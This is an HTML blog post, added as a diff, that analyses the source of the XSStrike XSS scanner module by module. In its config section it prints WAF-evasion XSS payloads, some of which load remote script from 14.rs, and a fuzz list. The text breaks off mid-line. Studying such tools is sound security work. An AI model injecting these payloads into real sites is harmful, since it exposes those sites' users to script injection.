@@ -1,0 +1,1713 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Ehiyor">
+    
+    <title>
+        
+            项目分析 |
+        
+        Ehiyor&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/hide.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"yxhhyy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Ehiyor's blog","author":"Ehiyor","avatar":"/images/1.jpg","logo":"/images/1.jpg","favicon":"/images/logo.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                    || fa-solid fa-tags","links":"/links                  || fa-solid fa-link","about":"/about                  || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"この人生に誠実になって幸せに生きてください","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/yxhhyy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"渗透测试learner"},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"updated_datetime_icon":"fa-solid fa-arrows-rotate","reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"unpkg"},"pjax":{"enable":true},"footer":{"since":null,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":["/css/hide.css"],"js":[null]},"aplayerInject":{"enable":true,"per_page":true},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script> -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/1.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Ehiyor&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-link"></i>
+                                </span>
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        项目分析
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/1.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Ehiyor</span>
+                                
+                                    <span class="author-badge">渗透测试learner</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-03-05 13:08:55</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-arrows-rotate"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed Mar 05 2025 13:11:21 GMT+0800">2025-03-05 13:11:21</span>
+                </span>
+            
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/web%E6%BC%8F%E6%B4%9E/">web漏洞</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="项目分析"><a class="markdownIt-Anchor" href="#项目分析"></a> 项目分析</h1>
+<h1 id="xsstrike"><a class="markdownIt-Anchor" href="#xsstrike"></a> XSStrike</h1>
+<h2 id="主程序入口-xsstrikepy"><a class="markdownIt-Anchor" href="#主程序入口-xsstrikepy"></a> 主程序入口 (<a class="link" target="_blank" rel="noopener" href="http://xsstrike.py">xsstrike.py<i class="fas fa-external-link-alt"></i></a>)</h2>
+<p>总体上可以由如下形式的代码概括说明：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> core.colors <span class="keyword">import</span> bad, info, good, run, green, red, white, end</span><br><span class="line"><span class="keyword">from</span> core.config <span class="keyword">import</span> verbose, update</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 解析命令行参数</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 处理不同的扫描模式</span></span><br><span class="line">    <span class="keyword">if</span> args.update:  <span class="comment"># 更新程序</span></span><br><span class="line">        update()</span><br><span class="line">    <span class="keyword">if</span> args.url:     <span class="comment"># 单URL扫描</span></span><br><span class="line">        singleScan(args.url, args.cookie, args.recursive)</span><br><span class="line">    <span class="keyword">if</span> args.seeds:   <span class="comment"># 批量URL扫描</span></span><br><span class="line">        massScan(args.seeds, args.cookie, args.recursive)</span><br></pre></td></tr></table></figure>
+<p>主要功能:</p>
+<ul>
+<li>程序入口点配置</li>
+<li>命令行参数解析</li>
+<li>调用不同的扫描模式</li>
+<li>版本更新检查</li>
+</ul>
+<h2 id="xss检测验证模块-corecheckerpy"><a class="markdownIt-Anchor" href="#xss检测验证模块-corecheckerpy"></a> XSS检测验证模块 (core/checker.py)</h2>
+<p>该模块用于验证XSS漏洞是否存在，通过注入特殊标记并检查响应。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checker</span>(<span class="params">url, params, headers, GET, delay, payload, positions, timeout, encoding</span>):</span><br><span class="line">    checkString = <span class="string">&#x27;st4r7s&#x27;</span> + payload + <span class="string">&#x27;3nd&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> encoding:</span><br><span class="line">        checkString = encoding(unquote(checkString))</span><br><span class="line">    response = requester(url, replaceValue(</span><br><span class="line">        params, xsschecker, checkString, copy.deepcopy), headers, GET, delay, timeout).text.lower()</span><br><span class="line">    reflectedPositions = []</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> re.finditer(<span class="string">&#x27;st4r7s&#x27;</span>, response):</span><br><span class="line">        reflectedPositions.append(<span class="keyword">match</span>.start())</span><br><span class="line">    filledPositions = fillHoles(positions, reflectedPositions)</span><br><span class="line">    <span class="comment">#  Itretating over the reflections</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    efficiencies = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> filledPositions:</span><br><span class="line">        allEfficiencies = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            reflected = response[reflectedPositions[num]</span><br><span class="line">                :reflectedPositions[num]+<span class="built_in">len</span>(checkString)]</span><br><span class="line">            efficiency = fuzz.partial_ratio(reflected, checkString.lower())</span><br><span class="line">            allEfficiencies.append(efficiency)</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> position:</span><br><span class="line">            reflected = response[position:position+<span class="built_in">len</span>(checkString)]</span><br><span class="line">            <span class="keyword">if</span> encoding:</span><br><span class="line">                checkString = encoding(checkString.lower())</span><br><span class="line">            efficiency = fuzz.partial_ratio(reflected, checkString)</span><br><span class="line">            <span class="keyword">if</span> reflected[:-<span class="number">2</span>] == (<span class="string">&#x27;\\%s&#x27;</span> % checkString.replace(<span class="string">&#x27;st4r7s&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;3nd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)):</span><br><span class="line">                efficiency = <span class="number">90</span></span><br><span class="line">            allEfficiencies.append(efficiency)</span><br><span class="line">            efficiencies.append(<span class="built_in">max</span>(allEfficiencies))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            efficiencies.append(<span class="number">0</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="literal">None</span>, efficiencies))</span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>生成随机的检查字符串(checkString)，用于验证XSS漏洞</li>
+<li>修改payload，添加特殊标记以便在响应中识别</li>
+<li>根据不同的环境(如属性值、HTML上下文)对payload进行适当的转义</li>
+<li>支持针对特定位置的XSS测试</li>
+<li>发送包含payload的请求并返回响应</li>
+<li>通过检查响应中是否包含特殊标记来判断XSS是否成功</li>
+</ul>
+<h2 id="终端颜色输出模块-corecolorspy"><a class="markdownIt-Anchor" href="#终端颜色输出模块-corecolorspy"></a> 终端颜色输出模块 (core/colors.py)</h2>
+<p>该模块定义了各种ANSI颜色代码，用于在终端中输出彩色文本，提高用户体验。</p>
+<p>概括性代码如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">colors = <span class="literal">True</span>  <span class="comment"># 输出应该是彩色的</span></span><br><span class="line">machine = sys.platform  <span class="comment"># 检测机器</span></span><br><span class="line"><span class="keyword">if</span> machine.lower().startswith((<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;win&#x27;</span>, <span class="string">&#x27;darwin&#x27;</span>, <span class="string">&#x27;ios&#x27;</span>)):</span><br><span class="line">    colors = <span class="literal">False</span>  <span class="comment"># 如果是windows或mac，禁用颜色</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> colors:</span><br><span class="line">    end = red = white = green = yellow = run = bad = good = info = que = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    white = <span class="string">&#x27;\033[97m&#x27;</span></span><br><span class="line">    green = <span class="string">&#x27;\033[92m&#x27;</span></span><br><span class="line">    red = <span class="string">&#x27;\033[91m&#x27;</span></span><br><span class="line">    yellow = <span class="string">&#x27;\033[93m&#x27;</span></span><br><span class="line">    end = <span class="string">&#x27;\033[0m&#x27;</span></span><br><span class="line">    back = <span class="string">&#x27;\033[7;91m&#x27;</span></span><br><span class="line">    info = <span class="string">&#x27;\033[93m[!]\033[0m&#x27;</span></span><br><span class="line">    que = <span class="string">&#x27;\033[94m[?]\033[0m&#x27;</span></span><br><span class="line">    bad = <span class="string">&#x27;\033[91m[-]\033[0m&#x27;</span></span><br><span class="line">    good = <span class="string">&#x27;\033[92m[+]\033[0m&#x27;</span></span><br><span class="line">    run = <span class="string">&#x27;\033[97m[~]\033[0m&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>根据操作系统自动判断是否支持彩色输出</li>
+<li>定义了多种颜色代码：白色、绿色、红色、黄色等</li>
+<li>定义了特殊标记：信息(info)、问题(que)、错误(bad)、成功(good)、运行(run)</li>
+<li>在不支持彩色输出的系统上自动禁用颜色</li>
+<li>提供了统一的颜色接口，方便其他模块使用</li>
+</ul>
+<h2 id="全局配置模块-coreconfigpy"><a class="markdownIt-Anchor" href="#全局配置模块-coreconfigpy"></a> 全局配置模块 (core/config.py)</h2>
+<p>该模块包含了XSStrike的全局配置参数，定义了各种默认设置和常量。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">changes = <span class="string">&#x27;&#x27;&#x27;Negligible DOM XSS false positives;x10 faster crawling&#x27;&#x27;&#x27;</span></span><br><span class="line">globalVariables = &#123;&#125;  <span class="comment"># it holds variables during runtime for collaboration across modules</span></span><br><span class="line"></span><br><span class="line">defaultEditor = <span class="string">&#x27;nano&#x27;</span></span><br><span class="line">blindPayload = <span class="string">&#x27;&#x27;</span>  <span class="comment"># your blind XSS payload</span></span><br><span class="line">xsschecker = <span class="string">&#x27;v3dm0s&#x27;</span>  <span class="comment"># A non malicious string to check for reflections and stuff</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies</span></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://0.0.0.0:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://0.0.0.0:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">minEfficiency = <span class="number">90</span>  <span class="comment"># payloads below this efficiency will not be displayed</span></span><br><span class="line"></span><br><span class="line">delay = <span class="number">0</span>  <span class="comment"># default delay between http requests</span></span><br><span class="line">threadCount = <span class="number">10</span>  <span class="comment"># default number of threads</span></span><br><span class="line">timeout = <span class="number">10</span>  <span class="comment"># default number of http request timeout</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attributes that have special properties</span></span><br><span class="line">specialAttributes = [<span class="string">&#x27;srcdoc&#x27;</span>, <span class="string">&#x27;src&#x27;</span>]</span><br><span class="line"></span><br><span class="line">badTags = (<span class="string">&#x27;iframe&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;textarea&#x27;</span>, <span class="string">&#x27;noembed&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;template&#x27;</span>, <span class="string">&#x27;noscript&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tags = (<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;d3v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;details&#x27;</span>)  <span class="comment"># HTML Tags</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;Things&quot; that can be used between js functions and breakers e.g. &#x27;&#125;;alert()//</span></span><br><span class="line">jFillings = (<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line"><span class="comment"># &quot;Things&quot; that can be used before &gt; e.g. &lt;tag attr=value%0dx&gt;</span></span><br><span class="line">lFillings = (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;%0dx&#x27;</span>)</span><br><span class="line"><span class="comment"># &quot;Things&quot; to use between event handler and = or between function and =</span></span><br><span class="line">eFillings = (<span class="string">&#x27;%09&#x27;</span>, <span class="string">&#x27;%0a&#x27;</span>, <span class="string">&#x27;%0d&#x27;</span>,  <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">fillings = (<span class="string">&#x27;%09&#x27;</span>, <span class="string">&#x27;%0a&#x27;</span>, <span class="string">&#x27;%0d&#x27;</span>, <span class="string">&#x27;/+/&#x27;</span>)  <span class="comment"># &quot;Things&quot; to use instead of space</span></span><br><span class="line"></span><br><span class="line">eventHandlers = &#123;  <span class="comment"># Event handlers and the tags compatible with them</span></span><br><span class="line">    <span class="string">&#x27;ontoggle&#x27;</span>: [<span class="string">&#x27;details&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;onpointerenter&#x27;</span>: [<span class="string">&#x27;d3v&#x27;</span>, <span class="string">&#x27;details&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;a&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;onmouseover&#x27;</span>: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;d3v&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">functions = (  <span class="comment"># JavaScript functions to get a popup</span></span><br><span class="line">    <span class="string">&#x27;[8].find(confirm)&#x27;</span>, <span class="string">&#x27;confirm()&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(confirm)()&#x27;</span>, <span class="string">&#x27;co\u006efir\u006d()&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(prompt)``&#x27;</span>, <span class="string">&#x27;a=prompt,a()&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payloads = (  <span class="comment"># Payloads for filter &amp; WAF evasion</span></span><br><span class="line">    <span class="string">&#x27;\&#x27;&quot;&lt;/Script&gt;&lt;Html Onmouseover=(confirm)()//&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&lt;imG/sRc=l oNerrOr=(prompt)() x&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;!--&lt;iMg sRc=--&gt;&lt;img src=x oNERror=(prompt)`` x&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;deTails open oNToggle=confi\u0072m()&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;img sRc=l oNerrOr=(confirm)() x&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;svg/x=&quot;&gt;&quot;/onload=confirm()//&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;svg%0Aonload=%09((pro\u006dpt))()//&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;iMg sRc=x:confirm`` oNlOad=e\u0076al(src)&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;sCript x&gt;confirm``&lt;/scRipt x&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;Script x&gt;prompt()&lt;/scRiPt x&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;sCriPt sRc=//14.rs&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;embed//sRc=//14.rs&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;base href=//14.rs/&gt;&lt;script src=/&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;object//data=//14.rs&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;s=&quot; onclick=confirm``&gt;clickme&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;svG oNLoad=co\u006efirm&amp;#x28;1&amp;#x29&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\&#x27;&quot;&gt;&lt;y///oNMousEDown=((confirm))()&gt;Click&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;a/href=javascript&amp;colon;co\u006efirm&amp;#40;&amp;quot;1&amp;quot;&amp;#41;&gt;clickme&lt;/a&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;img src=x onerror=confir\u006d`1`&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;svg/onload=co\u006efir\u006d`1`&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fuzzes = (  <span class="comment"># Fuzz strings to test WAFs</span></span><br><span class="line">    <span class="string">&#x27;&lt;test&#x27;</span>, <span class="string">&#x27;&lt;test//&#x27;</span>, <span class="string">&#x27;&lt;test&gt;&#x27;</span>, <span class="string">&#x27;&lt;test x&gt;&#x27;</span>, <span class="string">&#x27;&lt;test x=y&#x27;</span>, <span class="string">&#x27;&lt;test x=y//&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;test/oNxX=yYy//&#x27;</span>, <span class="string">&#x27;&lt;test oNxX=yYy&gt;&#x27;</span>, <span class="string">&#x27;&lt;test onload=x&#x27;</span>, <span class="string">&#x27;&lt;test/o%00nload=x&#x27;</span>,</span><br><span 